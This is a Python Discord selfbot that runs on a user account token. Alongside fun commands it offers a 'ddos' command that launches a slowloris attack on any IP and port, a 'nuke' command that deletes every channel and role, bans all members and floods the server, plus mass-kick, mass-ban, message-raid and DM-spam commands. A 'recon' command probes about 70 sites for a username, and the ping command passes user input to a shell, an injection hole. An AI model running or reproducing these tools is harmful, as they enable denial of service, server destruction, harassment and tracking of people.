from ast import Delete
from email import message
import subprocess
from turtle import title
import discord
import json
import os
import sys
import pyfiglet
import random
from colorama import Fore
import time
from datetime import datetime
import requests





os.system('cls || clear')




from discord.ext import commands



def banner():
    print('''

\033[93m



██╗  ██╗ █████╗ ██╗    ██╗██╗  ██╗
██║  ██║██╔══██╗██║    ██║██║ ██╔╝
███████║███████║██║ █╗ ██║█████╔╝ 
██╔══██║██╔══██║██║███╗██║██╔═██╗ 
██║  ██║██║  ██║╚███╔███╔╝██║  ██╗
╚═╝  ╚═╝╚═╝  ╚═╝ ╚══╝╚══╝ ╚═╝  ╚═╝
                                  

made by TheDebian

type #help for list of commands

\033[91m

''')

banner()

def RandomColor(): 
    randcolor = discord.Color(random.randint(0x000000, 0xFFFFFF))
    return randcolor

def RandString():
    return "".join(random.choice(string.ascii_letters + string.digits) for i in range(random.randint(14, 32)))


with open('./config.json') as f:
    config = json.load(f)
    stream_url = config.get('stream_url')
    tts_language = config.get('tts_language')

prefix = config.get('prefix')

bot = commands.Bot(
    description='Vampires Selfbot',
    command_prefix=prefix,
    self_bot=True
)




bot.remove_command('help')

@bot.command()
async def embed(ctx, *, message):
        await ctx.message.delete()

        now = datetime.now()

        current_time = now.strftime("%H:%M:%S")

 
        embedVar = discord.Embed(title=" ", description=" ", color=0x0000FF)

        embedVar.add_field(value=f"\n{message}\n", name="DebianBOT Says", inline=False)
        
        embedVar.set_footer(text=f"Today at {current_time}")
        
        
        await ctx.send(embed=embedVar)
        print("\n\033[94mMESSAGE HAS BEEN SENT!!! \033[91m \n")

@bot.command()
async def stream(ctx, *, message): 
    await ctx.message.delete()
    stream = discord.Streaming(
        name=message,
        url=stream_url
        
    )
    await bot.change_presence(activity=stream)
    print(f"\n\033[94mStreaming {message} Successfully!!! \033[91m \n")

@bot.command()
async def playgame(ctx, *, message): 
    await ctx.message.delete()
    game = discord.Game(
        name=message
    )
    await bot.change_presence(activity=game)
    print(f"\n\033[94mPlaying {message} Successfully!!! \033[91m \n")
    
@bot.command()
async def slap(ctx, member:discord.Member = None):
   await ctx.message.delete()
   print(f"\n\033[94mSlapping Successfully!!! \033[91m \n")
   if member == ctx.author:
     await ctx.send(f"{ctx.author} Dummy why tf you wanna slap yourself?")
   elif member == None:
     await ctx.send(f"```Mention someone to slap```")
   else:
   
     await ctx.send(f"***{ctx.author.mention} Slapped {member.mention}!***")
     await ctx.send("https://media.giphy.com/media/uqSU9IEYEKAbS/giphy.gif")


@bot.command()
async def trump(ctx, *, message="Hawk Debian Selfbot, join dsc.gg/hsu"): 
    await ctx.message.delete()
    msg = message.replace(' ', '+')
    await ctx.send("https://faketrumptweets.herokuapp.com/tweet?text=" + msg)

@bot.command()
async def pic(ctx, *, message): 
    await ctx.message.delete()
    await ctx.send(f"https://source.unsplash.com/random/720x600/?{message}")
    print(f"\n\033[94mSent {message} Pic Successfully!!! \033[91m \n")
@bot.command()
async def feed(ctx, member:discord.Member = None, *, message=""):
    await ctx.message.delete()
    feedGIF = ["https://thumbs.gfycat.com/EagerSpectacularHoverfly-max-14mb.gif", "https://i.imgur.com/1vC0R20.gif"]
    gif11 = random.choice(feedGIF)

    if (member == ctx.author or member == None):
        feedSelfResponse = [
            f"{ctx.author.mention} feeds them selves. So eating?",
            f"{ctx.author.mention} feeds themselves yum!",
            f"{ctx.author.mention} is feeding their hungry stomach",
            f"{ctx.author.mention} is being fed by... themselves",
        ]
        feed = random.choice(feedSelfResponse)
        embed = discord.Embed(color=0x9b59b6)
        embed.set_image(url=random.choice(feedGIF))
        embed.add_field(name="Feed", value=(feed))
        await ctx.send(f"***{feed}***")
        await ctx.send(gif11)
    else:
        feedResponse = [ 
            f"{ctx.author.mention} feeds {member.mention}",
            f"{member.mention} is being feed by {ctx.author.mention}. Open wide!",
            f"Yum! {ctx.author.mention} feeds {member.mention}. Here comes the airplane!",    
        ]  
        feed = random.choice(feedResponse)
        embed = discord.Embed(color=0x9b59b6)
        embed.set_image(url=random.choice(feedGIF))
        embed.add_field(name="Feed", value=(feed))
        await ctx.send(f"***{feed}***")
        await ctx.send(gif11)
@bot.command()
async def listen(ctx, *, message): 
    await ctx.message.delete()
    await bot.change_presence(
        activity=discord.Activity(
            type=discord.ActivityType.listening, 
            name=message, 
        ))
    print(f"\n\033[94mListening {message} Successfully!!! \033[91m \n")

@bot.command()
async def watch(ctx, *, message): 
    await ctx.message.delete()
    await bot.change_presence(
        activity=discord.Activity(
            type=discord.ActivityType.watching, 
            name=message
        ))
    print(f"\n\033[94mWatching {message} Successfully!!! \033[91m \n")



@bot.command(aliases=['markasread', 'ack'])
async def read(ctx): 
    await ctx.message.delete()
    for guild in bot.guilds:
        await guild.ack()

@bot.command()
async def help(ctx):
        await ctx.message.delete()

        now = datetime.now()

        current_time = now.strftime("%H:%M:%S")

 
        help1 = discord.Embed(title=" ", description=" ", color=0x0000FF)

   
        msg1 = '''
           HELP MENU

#help         -shows this help menu.

#embed [message]       -send embed message.

#trump [message]       -send trump twitter message.

#clear       -clears console window.

#read       -reads all channel messages.

#slap [username]       -slaps the mentioned user.

#feed [username]       -feeds the mentioned user.

#pic [name]       -searches the pic with specified name.

#stream [message]     -streams whatever ya wanna stream.

#playgame [message]     -plays whatever ya wanna play.

#listen [message]     -listens whatever ya wanna listen.

#watch [message]     -watches whatever ya wanna watch.

#ping [Hostnaname]     -pings the IP/Webhost.

#recon [username]     -runs a reconnaissance to find that username in all social media.

#ddos [IP] [Port]     -uses the slowloris ddos attack at IP address.

#purge       -clears/purges messages.

#raid [amount] [message]       -spams.

#spamdm [username] [amount] [message]       -spams in dms.

#nuke [name]      -nukes the server and masscreates everything with specified name.

#massban       -bans everyone.

#masskick       -kicks everyone.

#massrole [name]       -mass creates roles.

#masschannel [name]       -mass creates roles.

#ascii [message]       -converts message to ascii.

#delchannels       -deletes all channels.

#delroles       -deletes all roles.

#exit       -exits out of application.'''

          
        msg = '''[+] #help:


    [*] #cmd         -shows help in console window.
    [*] #embed [message]       -send embed message.
    [*] #clear       -clears console window.
    [*] #read       -reads all channel messages.
    [*] #stream [message]     -streams whatever ya wanna stream.
    [*] #playgame [message]     -plays whatever ya wanna play.
    [*] #listen [message]     -listens whatever ya wanna listen.
    [*] #watch [essage]     -watches whatever ya wanna watch.
    [*] #trump [message]       -send trump twitter message.
    [*] #ping [Hostnaname]     -pings the IP/Webhost.
    [*] #recon [username]     -runs a reconnaissance to find that username in all social media.
    [*] #ddos [IP] [Port]     -uses the slowloris ddos attack at IP address.
    [*] #purge       -clears/purges messages.
    [*] #raid [amount] [message]       -spams.
    [*] #spamdm [username] [amount] [message]       -spams in dms.
    [*] #nuke [name]      -nukes the server and masscreates everything with specified name.
    [*] #massban       -bans everyone.
    [*] #masskick       -kicks everyone.
    [*] #massrole [name]       -mass creates roles.
    [*] #masschannel [name]       -mass creates roles.
    [*] #ascii [message]       -converts message to ascii.
    [*] #delchannels       -deletes all channels.
    [*] #delroles       -deletes all roles.
    [*] #slap {username}       -slaps the mentioned user.
    [*] #feed {username}       -feeds the mentioned user.
    [*] #pic {name}       -searches the pic with specified name.
    [*] #exit       -exits out of application.'''



        help1.add_field(value=f"\n{msg1}\n", name="Command List", inline=False)
        
      
        try:
            
            await ctx.send(embed=help1)
            print(f"\033[94m{msg}\033[91m")
            

        except:
            await ctx.send(f"```{msg1}```")
            print(f"\033[94m{msg}\033[91m")

@bot.command()
async def ascii(ctx, *, args):
    
    await ctx.message.delete()
    text = pyfiglet.figlet_format(args)
    await ctx.send(f"```{text}```")
    print("\n\033[94mASCII COMMAND HAS BEEN USED!!! \033[91m \n")


@bot.command()
async def ping(ctx, *, message):
    await ctx.message.delete()
    l = await ctx.send("```Pinging... Please wait!```")
    proc = subprocess.Popen(["ping", message], stdout=subprocess.PIPE, shell=True)
    (out, err) = proc.communicate()
    out1 = out.decode()

    await l.delete()
    if "Reply from" in out1:
        await ctx.send(f"***{message}***  is up!")
    elif "Request timed out" in out1:
        await ctx.send(f"***{message}***  Request Time-Out / Offline!")
    else:
        await ctx.send(f"***{message}***  Host Unreachable!")
    
    print("\n\033[94mping COMMAND HAS BEEN USED!!! \033[91m \n")

@bot.command()
async def ddos(ctx, ip1="", *, port1=""):
    await ctx.message.delete()
    if ip1 == "":
        await ctx.send("```Please Provide IP Address```")
    elif port1 == "":
        os.system(f" start python slowloris/slowloris.py {ip1} || python3 slowloris/slowloris.py {ip1}")
        print("\n\033[94mddos COMMAND HAS BEEN USED!!! \033[91m \n")
    else:
        os.system(f" start python slowloris/slowloris.py {ip1} -p {port1} || python3 slowloris/slowloris.py {ip1} -p {port1}")
        print("\n\033[94mddos COMMAND HAS BEEN USED!!! \033[91m \n")

@bot.command()
async def recon(ctx, *, u=""):
    await ctx.message.delete()
    if u == "":
        print("Provide a Username to find")
        await ctx.send("```Provide a Username to find```")
    os.system("cls || clear")
    r = "\033[31m"
    g = "\033[32m"
    y = "\033[33m"
    b='\33[36m'
    p = "\033[35m"
    print(banner)
    print(f"{r}NOTE:The data may not be compleatly accurate!\n")
    print(f"{r}NOTE: for educational purpose only!\n")
    social={
         "facebook":f"https://facebook.com/{u}",
         "youtube":f"https://youtube.com/{u}",
         "instagram":f"https://instagram.com/{u}",
         "vimeo":f"https://vimeo.com/{u}",
         "github":f"https://github.com/{u}",
         "plus":f"https://plus.google.com/{u}",
         "pinterest":f"https://pinterest.com/{u}",
         "flickr":f"https://flickr.com/people/{u}",
         "vk":f"https://vk.com/{u}",
         "about":f"https://about.me/{u}",
         "disqus":f"https://disqus.com/{u}",
         "bitbucket":f"https://bitbucket.org/{u}",
         "flipboard":f"https://flipboard.com/@{u}",
         "twitter":f"https://twitter.com/{u}",
         "medium":f"https://medium.com/@{u}",
         "hackerone":f"https://hackerone.com/{u}",
         "keybase":f"https://keybase.io/{u}",
         "buzzfeed":f"https://buzzfeed.com/{u}",
         "slideshare":f"https://slideshare.net/{u}",
         "mixcloud":f"https://mixcloud.com/{u}",
         "soundcloud":f"https://soundcloud.com/{u}",
         "badoo":f"https://badoo.com/en/{u}",
         "imgur":f"https://imgur.com/user/{u}",
         "spotify":f"https://open.spotify.com/user/{u}",
         "pastebin":f"https://pastebin.com/u/{u}",
         "wattpad":f"https://wattpad.com/user/{u}",
         "canva":f"https://canva.com/{u}",
         "codecademy":f"https://codecademy.com/{u}",
         "last":f"https://last.fm/user/{u}",
         "blip":f"https://blip.fm/{u}",
         "dribbble":f"https://dribbble.com/{u}",
         "gravatar":f"https://en.gravatar.com/{u}",
         "foursquare":f"https://foursquare.com/{u}",
         "creativemarket":f"https://creativemarket.com/{u}",
         "ello":f"https://ello.co/{u}",
         "cash":f"https://cash.me/{u}",
         "angel":f"https://angel.co/{u}",
         "wikipedia":f"https://www.wikipedia.org/wiki/User:{u}",
         "500px":f"https://500px.com/{u}",
         "houzz":f"https://houzz.com/user/{u}",
         "tripadvisor":f"https://tripadvisor.com/members/{u}",
         "kongregate":f"https://kongregate.com/accounts/{u}",
         "blogspot":f"https://{u}.blogspot.com/",
         "tumblr":f"https://{u}.tumblr.com/",
         "wordpress":f"https://{u}.wordpress.com/",
         "devianart":f"https://{u}.devianart.com/",
         "designspiration":f"https://www.designspiration.net/{u}",
         "slack":f"https://{u}.slack.com/",
         "livejournal":f"https://{u}.livejournal.com/",
         "newgrounds":f"https://{u}.newgrounds.com/",
         "hubpages":f"https://{u}.hubpages.com",
         "contently":f"https://{u}.contently.com",
         "steamcommunity":f"https://steamcommunity.com/id/{u}",
         "freelancer":f"https://www.freelancer.com/u/{u}",
         "dailymotion":f"https://www.dailymotion.com/{u}",
         "instructables":f"https://www.instructables.com/member/{u}",
         "etsy":f"https://www.etsy.com/shop/{u}",
         "scribd":f"https://www.scribd.com/{u}",
         "colourlovers":f"https://www.colourlovers.com/love/{u}",
         "patreon":f"https://www.patreon.com/{u}",
         "behance":f"https://www.behance.net/{u}",
         "goodreads":f"https://www.goodreads.com/{u}",
         "gumroad":f"https://www.gumroad.com/{u}",
         "codementor":f"https://www.codementor.io/{u}",
         "reverbnation":f"https://www.reverbnation.com/{u}",
         "bandcamp":f"https://www.bandcamp.com/{u}",
         "ifttt":f"https://www.ifttt.com/p/{u}",
         "trakt":f"https://www.trakt.tv/users/{u}",
         "okcupid":f"https://www.okcupid.com/profile/{u}",
         "trip":f"https://www.trip.skyscanner.com/user/{u}",
         "zone-h":f"http://www.zone-h.org/archive/notifier={u}"
    }
    os.system("cls || clear")
    print(banner)
    spece=" "*20
    print(f"{g}#"*126)
    print(f"{g}# {r}SOCIAL MEDIA   {g}|        {r}USER {g}        | {r}STATUS CODE{g} | {r}                   URL   {g}      {spece}                   #")
    await ctx.send(f"``` Running RECON on {u}... Please Check Terminal/Command Prompt ```")
    for i,j in social.items():
     try:
      req = requests.get(j)
      code=req.status_code
     except requests.exceptions.TooManyRedirects:
      print("TooManyRedirects")
      break
     except requests.exceptions.ConnectionError:
      print("\n\nConnectionError!\n\ncheck your internet connection!\n\n")
      break
     except requests.exceptions.Timeout: 
      continue
     print(f"{g}#"+f"{p}-"*124+f"{g}#")
     if code==200:
      user=f"{g}|{y}        Found        "
     elif code==404:
      user=f"{g}|{r}      Not Found      "
     else:
      user=f"{g}|{b}undefined status code"
      j="none"
     media=f"{g}# {y}"+i+" "*(15-len(i))
     code=f"{g}|     {y}"+str(code)+" "*5
     url=f"{g}|{y} "+j+" "*(70-len(j))+f"{g}#"
     print(media+user+code+url)
    print("#"*126)
    print(f"\n{r}vist {g}https://en.wikipedia.org/wiki/List_of_HTTP_status_codes{r} to know more about status codes!\n")
    print(f"{b}Thank you\n")
        


@bot.command()
async def raid(ctx, amount: int, *, message): 
    await ctx.message.delete()
    print("\n\033[94mRAIDING THE SERVER!!! \033[91m \n")    
    for _i in range(amount):
        await ctx.send(message)
    print("\n\033[94mRAIDING SUCCESFUL!!! \033[91m \n")



@bot.command()
async def nuke(ctx, *, message1="Nuked by TheDebianSec"):

    print("\n\033[94mNUKING THE SERVER!!! \033[91m \n")
    await ctx.message.delete()
    for channel in list(ctx.guild.channels):
        try:
            await channel.delete()    
        except:
            pass
    for user in list(ctx.guild.members):
        try:
            await user.ban()
        except:
            pass    
    for role in list(ctx.guild.roles):
        try:
            await role.delete()
        except:
            pass
    try:
        await ctx.guild.edit(
            name=RandString(),
            description="vampire nuke",
            reason="ummmmmmm hmar",
            icon=None,
            banner=None
    
        )  
    except:
        pass        
    for _i in range(250):
        await ctx.guild.create_text_channel(name=message1)
    for _i in range(250):
        await ctx.guild.create_role(name=message1, color=RandomColor())
    print("\n\033[94mNUKE SUCCESSFUL!!! \033[91m \n")

@bot.command()
async def masskick(ctx): 
    await ctx.message.delete()
    for user in list(ctx.guild.members):
        try:
            await user.kick()
            print("\n\033[94mMASSKICK SUCCESS!!! \033[91m \n")

        except:
            print("\nMASSKICK FAILED!!! \033[91m \n")


            pass 


@bot.command()
async def massban(ctx): 
    await ctx.message.delete()
    for user in list(ctx.guild.members):
        try:
            await user.ban()
            print("\n\033[94mMASSBAN SUCCESS!!! \033[91m \n")

        except:
            print("\nMASSBAN FAILED!!! \033[91m \n")
    
@bot.command()
async def massrole(ctx, *, message="TheDebianSec"): 
    await ctx.message.delete()
    print("\n\033[94mCREATING MASS ROLES!!! \033[91m \n")
    for _i in range(250):
        try:
            await ctx.guild.create_role(name=message, color=RandomColor())
    
        except:
            
            return 

@bot.command()
async def delchannels(ctx): 
    await ctx.message.delete()
    print("\n\033[94mDELETED ALL CHANNELS!!! \033[91m \n")

    for channel in list(ctx.guild.channels):
        try:
            await channel.delete()
        except:
            return
@bot.command()
async def purge(ctx, amount: int): 
    await ctx.message.delete()
    print(f"\n\033[94mDELETING {amount} MESSAGES!!! \033[91m \n")
    async for message in ctx.message.channel.history(limit=amount).filter(lambda m: m.author == bot.user).map(lambda m: m):
        try:
           await message.delete()
        except:
           

            pass


@bot.command()
async def exit(ctx): 
    sys.exit()


@bot.command() 
async def delroles(ctx): 
    await ctx.message.delete()
    print("\n\033[94mDELETED ALL ROLES!!! \033[91m \n")

    for role in list(ctx.guild.roles):
        try:
            await role.delete()
        except:
            pass

@bot.command()
async def clear(ctx): 
    await ctx.message.delete()
    os.system('cls || clear')
    banner()

@bot.command()
async def masschannel(ctx, *, message="TheDebianSec"): 
    await ctx.message.delete()
    print("\n\033[94mMASS CHANNELS CREATING!!! \033[91m \n")
    for _i in range(250):
        try:
            await ctx.guild.create_text_channel(name=messag)
            
    
        except:
            print("\nMASS CHANNELS FAILED!!! \033[91m \n")

            return



@bot.command()
async def spamdm(ctx, user : discord.Member, amount1: int, *, message): 
    await ctx.message.delete()
    user = bot.get_user(user.id)
    if ctx.author.id == bot.user.id:
        return
    else:
        try:
            print("\n\033[94mSPAMMING!!! \033[91m \n")
            
            for dmspam in range(amount1):
                await user.send(message) 
            print("\n\033[94mSPAM DONE!!! \033[91m \n")
            
        except:
            print("\n[94mSPAM FAILED \033[91m \n")

            pass   






token = config.get('token')





bot.run(token, bot=False)




